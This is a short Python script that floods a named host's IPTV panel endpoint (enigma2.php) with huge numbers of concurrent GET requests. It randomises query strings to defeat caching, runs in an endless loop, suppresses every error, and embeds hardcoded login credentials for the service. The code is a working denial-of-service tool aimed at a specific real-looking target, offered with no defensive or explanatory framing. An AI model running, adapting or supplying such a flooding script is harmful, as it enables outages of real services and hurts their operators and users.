import random
import asyncio
from aiohttp import ClientSession
import random
import string

MAXREQ = 100000000000
MAXTHREAD = 1000000

def random_string(length:int=6, charset:str=string.ascii_letters+string.digits):
    return ''.join([random.choice(charset) for i in range(length)])


async def fetch(url, session):
    try:
        async with session.get(url) as response:
            delay = response.headers.get("DELAY")
            date = response.headers.get("DATE")
            #print("{}:{} with delay {}".format(date, response.url, delay))
            #print(response.status)
            return await response.read()
    except:
        pass


async def bound_fetch( url, session):
    # Getter function with semaphore.
    g_thread_limit = asyncio.Semaphore(MAXTHREAD)
    async with g_thread_limit:
        x=await fetch(url, session)
        

async def run(r):
    url = "http://venex.rocks/enigma2.php?username={}&password={}&type=get_vod_categories"
    url="http://venex.rocks/enigma2.php?username=XJAJ1pXgQx&password=r3PKoC2XkZ&type=get_live_categories&{}={}"
    tasks = []

    # Create client session that will ensure we dont open new connection
    # per each request.
    async with ClientSession() as session:
        for i in range(r):
            # pass session to every GET request
            task = asyncio.ensure_future(bound_fetch(url.format(random_string(10),random_string(10)), session))
            tasks.append(task)

        responses = asyncio.gather(*tasks)
        await responses


while True:
    try:
        number = MAXREQ
        loop = asyncio.get_event_loop()

        future = asyncio.ensure_future(run(number))
        loop.run_until_complete(future)
    except:
        pass